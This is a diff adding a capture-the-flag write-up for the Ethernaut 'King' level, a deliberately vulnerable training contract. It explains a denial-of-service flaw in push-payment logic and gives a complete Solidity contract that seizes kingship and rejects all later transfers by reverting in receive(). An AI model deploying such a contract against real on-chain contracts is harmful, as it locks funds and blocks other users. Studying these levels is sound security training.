@@ -414,3 +414,72 @@ await contract.locked();
 
 ## Level completed
 ![Level Complete Output](assets/Vault.png)
+
+
+# Ethernaut Level 9: King
+
+## Strategy
+
+- **Vulnerability**: The `King` contract relied on sending Ether to the previous king using `.transfer()`. If the previous king was a smart contract that reverted in its `receive()` function, the transaction would fail, and the new king couldn’t be replaced — effectively locking the contract.
+- **Exploit**: I deployed a malicious contract (`KingAttack`) that:
+  1. Sent more Ether than the current `prize` to claim kingship.
+  2. Reverted any future Ether transfers via its `receive()` function.
+- **Outcome**: When Ethernaut’s level logic attempted to reclaim kingship, it failed due to the revert, and I remained the king — completing the level.
+
+---
+
+## Commands Used
+
+### 1. Checked the current balance of the King contract
+```
+(await web3.eth.getBalance("0x72DF418D0D0F0A30625aB7F6cCE70eA7218b2168")).toString()
+```
+I used this command to find the current `prize` amount, so I could send a higher amount and become the new king.
+
+**Output**: `"1000000000000000"` (1,000,000,000,000,000 wei)
+
+---
+
+### 2. Deployed the `KingAttack` contract
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract KingAttack {
+    address public target;
+
+    constructor(address _target) payable {
+        target = _target;
+        (bool success, ) = target.call{value: msg.value}("");
+        require(success, "Failed to become king");
+    }
+
+    receive() external payable {
+        revert("Nope!");
+    }
+}
+```
+
+**Deployment Parameters**:
+- Target address: the `King` contract instance address.
+- Value sent: `1,100,000,000,000,000 wei` (more than the current prize).
+
+**Reason**:  
+I used the constructor to immediately send Ether to the King contract and claim the throne. The `receive()` function reverted any further Ether transfers, preventing anyone — including the level itself — from dethroning my contract.
+
+---
+
+### 3. Verified kingship
+```
+await contract._king();
+```
+
+I used this to confirm that my `KingAttack` contract had become the new king.
+
+**Output**: Address of the `KingAttack` contract
+
+---
+
+## Level Completed
+
+![Level Complete Output](assets/King.png)
